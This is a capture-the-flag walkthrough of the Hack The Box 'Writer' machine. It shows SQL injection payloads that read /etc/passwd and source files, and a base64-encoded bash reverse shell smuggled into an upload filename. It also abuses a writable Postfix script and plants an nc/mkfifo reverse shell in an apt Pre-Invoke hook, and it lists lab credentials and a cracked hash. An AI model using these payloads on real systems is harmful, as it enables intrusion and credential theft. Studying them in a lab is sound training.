# Writer

Completed: Yes Created: August 17, 2021 12:33 AM Platform: Hack The Box

## Enumeration

### Nmap

```bash
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### http

Found blog and admin panel on /administrative. Also, I found the username of admin: `admin@writer.htb`.

### smb

List:

```bash
┌──(kali㉿kali)-[~]
└─$ smbclient -N -L \\\\10.10.11.101\\            

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        writer2_project Disk      
        IPC$            IPC       IPC Service (writer server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

Accesses:

```bash
┌──(kali㉿kali)-[~]
└─$ smbclient -U '%' \\\\10.10.11.101\\print$
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ smbclient -U '%' \\\\10.10.11.101\\writer2_project                                                                                                                                                                                   1 ⨯
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ smbclient -U '%' \\\\10.10.11.101\\IPC$                                                                                                                                                                                              1 ⨯
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
```

## Gaining access

Well, I don't get some vectors from enumeration except administrative path. I tried to do a simple SQL injection and it worked.

```
POST /administrative HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://writer.htb
Connection: close
Referer: http://writer.htb/administrative
Upgrade-Insecure-Requests: 1

uname=admin'+or+1%3d1+#&password=admin
```

```
<h3 class="animation-slide-top">Welcome admin</h3>
                </header>
                <p class="success-advise">Redirecting you to the dashboard. If you are not redirected then click the button below to be redirected.</p>
                <a class="btn btn-primary btn-round mb-5" href="/dashboard">CLICK HERE</a>
                <footer class="page-copyright">
                    <p>© Writer.HTB 2021. All RIGHT RESERVED.</p>
```

If you try to go to something like [`http://writer.htb/dashboard/stories.php`](http://writer.htb/dashboard/stories.php). You will receive 404 not found, which indicates that it is not a PHP web app. We obtained the access to admin panel, but it doesn't contain something that we could exploit in order to get code execution. I'll try to use sqlmap to get the most impact from SQLi. sqlmap identified this vulnerable parameter name as a parameter that is vulnerable to union attack and also time-based.

```bash
[10:07:27] [INFO] retrieved: information_schema
[10:09:40] [INFO] retrieved: writer
```

```bash
sqlmap -u http://writer.htb/administrative --data="uname=&password=" --dbms=mysql -D writer --dump
[10:15:37] [INFO] retrieved: site
[10:16:00] [INFO] retrieved: stori
[10:16:20] [ERROR] invalid character detected. retrying..
[10:16:20] [WARNING] increasing time delay to 2 seconds
es
[10:16:32] [INFO] retrieved: users
```

```bash
sqlmap -u http://writer.htb/administrative --data="uname=&password=" --dbms=mysql -D writer -T users --dump
Database: writer
Table: users
[1 entry]
+----+------------------+--------+----------------------------------+----------+--------------+
| id | email            | status | password                         | username | date_created |
+----+------------------+--------+----------------------------------+----------+--------------+
| 1  | admin@writer.htb | Active | 118e48794631a9612484ca8b55f622d0 | admin    | NULL         |
+----+------------------+--------+----------------------------------+----------+--------------+
```

The hash is `118e48794631a9612484ca8b55f622d0`. I can't crack it with john or hashcat. There's something else about [SQLi.](http://sqli.it) It is not possible to spawn a shell here. However, we can try to read some files.

```bash
$ sqlmap -u http://writer.htb/administrative --data="uname=&password=" --dbms=mysql --web-root="/var/www/html" --file-read="about.html" --time-sec=5
```

Hmm, I thought that SQLi is doing something wrong, because there is another way to leak the information, via the second field in union query which will be returned to us in the message like 'welcome admin' but instead of admin, it will be our response. Let's try:

```
POST /administrative HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Origin: http://writer.htb
Connection: close
Referer: http://writer.htb/administrative
Upgrade-Insecure-Requests: 1

uname=admin'+union+select+null,load_file('/etc/passwd'),null,null,null,null%3b+%23&password=admin
```

Got /etc/passwd:

```
HTTP/1.1 200 OK
Date: Tue, 17 Aug 2021 14:57:43 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Cookie,Accept-Encoding
Set-Cookie: session=.eJyrViotTi1SslJKTMnNzFNXKM3LzM9TKE7NSU0uUcgrzcnRyclPTIlPy8xJ1VDXTy1J1i9ILC4uT1HX1AHLohLWCspKtQDQLB0e.YRvOZw.DO021Kfoe8Gl-o9ELde-ih2CLDw; HttpOnly; Path=/
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 3337

<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="refresh" content="0.1; URL=/dashboard" />
    <title>Redirecting | Writer.HTB</title>
    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="css/redirect.css" rel="stylesheet">
</head>

<body>
    <div class="wrapper">
        <div class="page vertical-align text-center">
            <div class="page-content vertical-align-middle">
                <header>
                    <h3 class="animation-slide-top">Welcome adminroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
postfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin
filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh
john:x:1001:1001:,,,:/home/john:/bin/bash
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
</h3>
                </header>
                <p class="success-advise">Redirecting you to the dashboard. If you are not redirected then click the button below to be redirected.</p>
                <a class="btn btn-primary btn-round mb-5" href="/dashboard">CLICK HERE</a>
                <footer class="page-copyright">
                    <p>© Writer.HTB 2021. All RIGHT RESERVED.</p>
                </footer>
            </div>
        </div>
    </div>
    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
</body>

</html>
```

Now, we know about users `john`and `kyle`. Now, enumerate other files. We need to find the root folder of the site on the machine. For this, let's try to see the config of Apache:

```bash
┌──(kali㉿kali)-[~/…/HackTheBox/Medium/Writer/gain_access]
└─$ cd /etc/apache2/sites-enabled/ 
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[/etc/apache2/sites-enabled]
└─$ ls -la
total 8
drwxr-xr-x 2 root root 4096 May 30 17:24 .
drwxr-xr-x 8 root root 4096 Aug 13 10:23 ..
lrwxrwxrwx 1 root root   35 May 30 17:24 000-default.conf -> ../sites-available/000-default.conf
```

payload: `admin'+union+select+null,load_file('/etc/apache2/sites-enabled/000-default.conf'),null,null,null,null%3b+%23`.

```
Welcome admin# Virtual host configuration for writer.htb domain
&lt;VirtualHost *:80&gt;
        ServerName writer.htb
        ServerAdmin admin@writer.htb
        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
        &lt;Directory /var/www/writer.htb&gt;
                Order allow,deny
                Allow from all
        &lt;/Directory&gt;
        Alias /static /var/www/writer.htb/writer/static
        &lt;Directory /var/www/writer.htb/writer/static/&gt;
                Order allow,deny
                Allow from all
        &lt;/Directory&gt;
        ErrorLog ${APACHE_LOG_DIR}/error.log
        LogLevel warn
        CustomLog ${APACHE_LOG_DIR}/access.log combined
&lt;/VirtualHost&gt;

# Virtual host configuration for dev.writer.htb subdomain
# Will enable configuration after completing backend development
# Listen 8080
#&lt;VirtualHost 127.0.0.1:8080&gt;
#	ServerName dev.writer.htb
#	ServerAdmin admin@writer.htb
#
        # Collect static for the writer2_project/writer_web/templates
#	Alias /static /var/www/writer2_project/static
#	&lt;Directory /var/www/writer2_project/static&gt;
#		Require all granted
#	&lt;/Directory&gt;
#
#	&lt;Directory /var/www/writer2_project/writerv2&gt;
#		&lt;Files wsgi.py&gt;
#			Require all granted
#		&lt;/Files&gt;
#	&lt;/Directory&gt;
#
#	WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env
#	WSGIProcessGroup writer2_project
#	WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py
#        ErrorLog ${APACHE_LOG_DIR}/error.log
#        LogLevel warn
#        CustomLog ${APACHE_LOG_DIR}/access.log combined
#
#&lt;/VirtualHost&gt;
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

Thus, we found the webroot `/var/www/writer.htb/writer`. Now, check `writer.wsgi` file.

```
Welcome admin#!/usr/bin/python
import sys
import logging
import random
import os

# Define logging
logging.basicConfig(stream=sys.stderr)
sys.path.insert(0,&#34;/var/www/writer.htb/&#34;)

# Import the __init__.py from the app folder
from writer import app as application
application.secret_key = os.environ.get(&#34;SECRET_KEY&#34;, &#34;&#34;)
```

Hehe, we found the app folder which is a writer inside writer.htb. And writer.wsgi imports **init**.py. Get this file too. If you see it wisely, you can find there import os, which is a vector.

```python
$ cat __init__.py | grep os
import os
        connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')
#Define blog posts
@app.route('/blog/post/&lt;id&gt;', methods=['GET'])
def blog_post(id):
                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                        im.close()
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        os.system("rm {}".format(image))
                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                        im.close()
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        os.system("rm {}".format(image))
```

You can find command injection if you'll see the edit\_story function, that the command injection vulnerability is within filename itself, so we need to generate a filename that will contain bash reverse shell, but we can't just create a filename with bash in its name.Thus, we need to encode the payload with base64 encoding and then decode it and send it to bash on the server:

Create a file with extension jpg and the content of bash reverse shell:

```bash
$ echo -n '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.9/44444 0>&1"' | base64                                                                                                                                                     
L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS80NDQ0NCAwPiYxIg==
```

Now, create a file:

```bash
$ touch 'revshell.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS80NDQ0NCAwPiYxIg== | base64 -d | bash `;'
```

Then, you need to the following steps:

* create a new story and choose as a file our created file with its strange filename
* after it is done, check it in /static/img, if it was really created.
* Now, you can inject the SSRF payload something like: `file:///var/www/writer.htb/writer/static/img/revshell.jpg; echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS80NDQ0NCAwPiYxIg== | base64 -d | bash;#`

The code will take the param `image_url` from request and retrieve URL which is `file:///`. Then, the filename will be used within this code `os.system("mv {} {}.jpg".format(local_filename, local_filename))`.

Finally, I received my reverse shell:

```bash
$ nc -lnvp 44444
listening on [any] 44444 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.101] 59344
bash: cannot set terminal process group (1042): Inappropriate ioctl for device
bash: no job control in this shell
www-data@writer:/$
```

Also, we had an access to smb with creds: `kyle:ToughPasswordToCrack`:

```bash
$ smbclient -U "kyle" \\\\10.10.11.101\\writer2_project
Enter WORKGROUP\kyle's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Aug  2 02:52:48 2021
  ..                                  D        0  Tue Jun 22 13:55:06 2021
  static                              D        0  Sun May 16 16:29:16 2021
  staticfiles                         D        0  Fri Jul  9 06:59:42 2021
  writer_web                          D        0  Wed May 19 11:26:18 2021
  requirements.txt                    N       15  Tue Aug 17 12:56:01 2021
  writerv2                            D        0  Wed May 19 08:32:41 2021
  manage.py                           N      806  Tue Aug 17 12:56:01 2021

                7151096 blocks of size 1024. 2412600 blocks available
smb: \>
```

But I didn't find something that we could do with this access.

## Privilege escalation

Started linpeas which found interesting mariadb config:

```bash
www-data@writer:/etc/mysql$ cat mariadb.cnf 
# The MariaDB configuration file
#
# The MariaDB/MySQL tools read configuration files in the following order:
# 1. "/etc/mysql/mariadb.cnf" (this file) to set global defaults,
# 2. "/etc/mysql/conf.d/*.cnf" to set global options.
# 3. "/etc/mysql/mariadb.conf.d/*.cnf" to set MariaDB-only options.
# 4. "~/.my.cnf" to set user-specific options.
#
# If the same option is defined multiple times, the last one will apply.
#
# One can use all long options that the program supports.
# Run program with --help to get a list of available options and with
# --print-defaults to see which it would actually understand and use.

#
# This group is read both both by the client and the server
# use it for options that affect everything
#
[client-server]

# Import all .cnf files from configuration directory
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

[client]
database = dev
user = djangouser
password = DjangoSuperPassword
default-character-set = utf8
```

Received the kyle's hash:

```bash
www-data@writer:/etc/mysql$ mysql -u djangouser -p
Enter password: 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 5338
Server version: 10.3.29-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [dev]> show databases;
+--------------------+
| Database           |
+--------------------+
| dev                |
| information_schema |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [dev]> use dev;
Database changed
MariaDB [dev]> show tables;
+----------------------------+
| Tables_in_dev              |
+----------------------------+
| auth_group                 |
| auth_group_permissions     |
| auth_permission            |
| auth_user                  |
| auth_user_groups           |
| auth_user_user_permissions |
| django_admin_log           |
| django_content_type        |
| django_migrations          |
| django_session             |
+----------------------------+
10 rows in set (0.000 sec)

MariaDB [dev]> select * from auth_user;
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
| id | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
|  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
1 row in set (0.000 sec)

MariaDB [dev]>
```

Searching for Django hashing algorithm in hashcat:

```bash
$ hashcat -h | grep Django                                                                                                                                                                                                           
  10000 | Django (PBKDF2-SHA256)                           | Framework
    124 | Django (SHA-1)                                   | Framework
```

```bash
pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Django (PBKDF2-SHA256)
Hash.Target......: pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8...uXM4A=
Time.Started.....: Tue Aug 17 14:18:48 2021 (11 mins, 41 secs)
Time.Estimated...: Tue Aug 17 14:30:29 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       13 H/s (11.85ms) @ Accel:32 Loops:512 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 9408/14344385 (0.07%)
Rejected.........: 0/9408 (0.00%)
Restore.Point....: 9312/14344385 (0.06%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:259584-259999
Candidates.#1....: Jonathan -> 120287

Started: Tue Aug 17 14:18:46 2021
Stopped: Tue Aug 17 14:30:32 2021
```

```bash
$ ssh kyle@10.10.11.101                                                                                                                                                                                                              255 ⨯
kyle@10.10.11.101's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 17 Aug 18:32:07 UTC 2021

  System load:           0.0
  Usage of /:            65.1% of 6.82GB
  Memory usage:          33%
  Swap usage:            0%
  Processes:             256
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.101
  IPv6 address for eth0: dead:beef::250:56ff:feb9:22e

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Aug 17 12:21:23 2021 from 10.10.14.4
kyle@writer:~$
```

Checking kyle's permissions and groups :

```bash
kyle@writer:/tmp$ id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
kyle@writer:/tmp$ sudo -l
[sudo] password for kyle: 
Sorry, user kyle may not run sudo on writer.
```

From /etc/passwd we establish a connection between filter group and postfix mail agent:

```bash
filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh
```

Also, we can check open 25 port:

```bash
kyle@writer:/tmp$ netstat -ltn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::445                  :::*                    LISTEN     
tcp6       0      0 :::139                  :::*                    LISTEN
```

For postfix, we have only one exploits for local privesc:

```bash
searchsploit "Postfix"                                                                                                                                                                                                             127 ⨯
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
gld 1.4 - Postfix Greylisting Daemon Remote Format String                                                                                                                                                  | linux/remote/934.c
Postfix 1.1.x - Denial of Service (1)                                                                                                                                                                      | linux/dos/22981.c
Postfix 1.1.x - Denial of Service (2)                                                                                                                                                                      | linux/dos/22982.pl
Postfix 2.6-20080814 - 'symlink' Local Privilege Escalation                                                                                                                                                | linux/local/6337.sh
Postfix < 2.4.9/2.5.5/2.6-20080902 - '.forward' Local Denial of Service                                                                                                                                    | multiple/dos/6472.c
Postfix SMTP 4.2.x < 4.2.48 - 'Shellshock' Remote Command Injection                                                                                                                                        | linux/remote/34896.py
Salim Gasmi GLD (Greylisting Daemon) - Postfix Buffer Overflow (Metasploit)                                                                                                                                | linux/remote/16841.rb
Salim Gasmi GLD (Greylisting Daemon) 1.0 < 1.4 - Postfix Greylisting Buffer Overflow (Metasploit)                                                                                                          | linux/remote/10023.rb
Salim Gasmi GLD (Greylisting Daemon) 1.x - Postfix Greylisting Daemon Buffer Overflow                                                                                                                      | linux/remote/25392.c
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Checking the exploit: [https://www.exploit-db.com/exploits/6337](https://www.exploit-db.com/exploits/6337).

```bash
kyle@writer:/tmp$ vim exploit.sh
kyle@writer:/tmp$ chmod +x exploit.sh 
kyle@writer:/tmp$ ./exploit.sh 
#
# "rs_pocfix.sh" (PoC for Postfix local root vulnerability: CVE-2008-2936)
# by Roman Medina-Heigl Hernandez a.k.a. RoMaNSoFt <roman@rs-labs.com>
#
# Tested: Ubuntu / Debian
#
# [ Madrid, 30.Aug.2008 ]
#
[*] Postfix seems to be installed
[*] Hardlink to symlink not dereferenced
[!] Spool dir is not writable
```

Well, it doesn't work. Again started linpeas:

```bash
╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                                                                                                 
  Group kyle:                                                                                                                                                                                                                                
                                                                                                                                                                                                                                             
  Group filter:
/etc/postfix/disclaimer
```

That's strange and it is again about postfix. Look inside:

```bash
kyle@writer:/etc/postfix$ ls -la
total 140
drwxr-xr-x   5 root root    4096 Jul  9 10:59 .
drwxr-xr-x 102 root root    4096 Jul 28 06:32 ..
-rwxrwxr-x   1 root filter  1021 Aug 17 18:56 disclaimer
-rw-r--r--   1 root root      32 May 13 22:49 disclaimer_addresses
-rw-r--r--   1 root root     749 May 13 22:40 disclaimer.txt
-rw-r--r--   1 root root      60 May 13 22:27 dynamicmaps.cf
drwxr-xr-x   2 root root    4096 Jun 19  2020 dynamicmaps.cf.d
-rw-r--r--   1 root root    1330 May 18 19:41 main.cf
-rw-r--r--   1 root root   27120 May 13 22:27 main.cf.proto
lrwxrwxrwx   1 root root      31 May 13 22:27 makedefs.out -> /usr/share/postfix/makedefs.out
-rw-r--r--   1 root root    6373 Aug 17 18:56 master.cf
-rw-r--r--   1 root root    6208 May 13 22:27 master.cf.proto
-rw-r--r--   1 root root   10268 Jun 19  2020 postfix-files
drwxr-xr-x   2 root root    4096 Jun 19  2020 postfix-files.d
-rwxr-xr-x   1 root root   11532 Jun 19  2020 postfix-script
-rwxr-xr-x   1 root root   29872 Jun 19  2020 post-install
drwxr-xr-x   2 root root    4096 Jun 19  2020 sasl
```

So, the file disclaimer has permissions RWX and we have a group filter. Okay, it contains bash script. First thing that you can think is to inject bash reverse shell. Did it and started pspy64, but it seems postfix doesn't send a message...Let's force it to send.

Trying to send with telnet:

```bash
kyle@writer:/etc/postfix$ telnet localhost smtp
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
220 writer.htb ESMTP Postfix (Ubuntu)
ehlo writer.htb
250-writer.htb
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
mail from: kyle@writer.htb
250 2.1.0 Ok
rcpt to: john@writer.htb
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
Subject: test
Test test test.
.
250 2.0.0 Ok: queued as D0AEF7EC
```

Nothing. Trying to send with sendmail:

```bash
kyle@writer:/etc/postfix$ echo "Test" | sendmail -r kyle@writer.htb john@writer.htb
```

Nothing.

So, I wrote a simple python3 script to send email to john:

```python
kyle@writer:~/dont_touch$ cat postfix.py 
#!/usr/bin/env python3
import smtplib

host = '127.0.0.1'
port = 25
sender = 'kyle@writer.htb'
receiver = 'john@writer.htb'
message = """
    Subject: Test

    TEST
"""
smtp = smtplib.SMTP(host, port)
smtp.ehlo()
smtp.sendmail(sender, receiver, message)
smtp.quit()
```

It is also important to paste bash reverse shell at the beginning of the disclamer script. Finally, got john. Also found John private ssh key and logged in via ssh:

```bash
┌──(kali㉿kali)-[~/…/HackTheBox/Medium/Writer/privesc]
└─$ ssh john@10.10.11.101 -i john_id_rsa 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 17 Aug 19:43:06 UTC 2021

  System load:           0.0
  Usage of /:            65.4% of 6.82GB
  Memory usage:          35%
  Swap usage:            0%
  Processes:             264
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.101
  IPv6 address for eth0: dead:beef::250:56ff:feb9:22e

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Wed Jul 28 09:19:58 2021 from 10.10.14.19
john@writer:~$
```

Start to enumerate john:

```bash
john@writer:~/.ssh$ sudo -l
[sudo] password for john: 
john@writer:~/.ssh$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
```

```bash
╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                                                                                                 
  Group john:                                                                                                                                                                                                                                
                                                                                                                                                                                                                                             
  Group management:
/etc/apt/apt.conf.d
```

If you check this folder permission, you can see that the dot has all permissions for management. Also, we can find with pspy64 this command that runs periodically:

```bash
2021/08/17 19:52:01 CMD: UID=0    PID=269106 | /usr/sbin/CRON -f 
2021/08/17 19:52:01 CMD: UID=0    PID=269105 | /usr/bin/apt-get update
```

This article is useful for this case: [https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/](https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/).

We have a cronjob and also has permissions for `apt.conf.d`. So, just inject our netcat reverse shell:

```bash
john@writer:/etc/apt/apt.conf.d$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 9999 >/tmp/f"};' > pwn
john@writer:/etc/apt/apt.conf.d$ ls -la
total 52
drwxrwxr-x 2 root management 4096 Aug 17 19:56 .
drwxr-xr-x 7 root root       4096 Jul  9 10:59 ..
-rw-r--r-- 1 root root        630 Apr  9  2020 01autoremove
-rw-r--r-- 1 root root         92 Apr  9  2020 01-vendor-ubuntu
-rw-r--r-- 1 root root        129 Dec  4  2020 10periodic
-rw-r--r-- 1 root root        108 Dec  4  2020 15update-stamp
-rw-r--r-- 1 root root         85 Dec  4  2020 20archive
-rw-r--r-- 1 root root       1040 Sep 23  2020 20packagekit
-rw-r--r-- 1 root root        114 Nov 19  2020 20snapd.conf
-rw-r--r-- 1 root root        625 Oct  7  2019 50command-not-found
-rw-r--r-- 1 root root        182 Aug  3  2019 70debconf
-rw-r--r-- 1 root root        305 Dec  4  2020 99update-notifier
-rw-rw-r-- 1 john john        107 Aug 17 19:56 pwn
john@writer:/etc/apt/apt.conf.d$
```

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.101] 54250
/bin/sh: 0: can't access tty; job control turned off
#
```
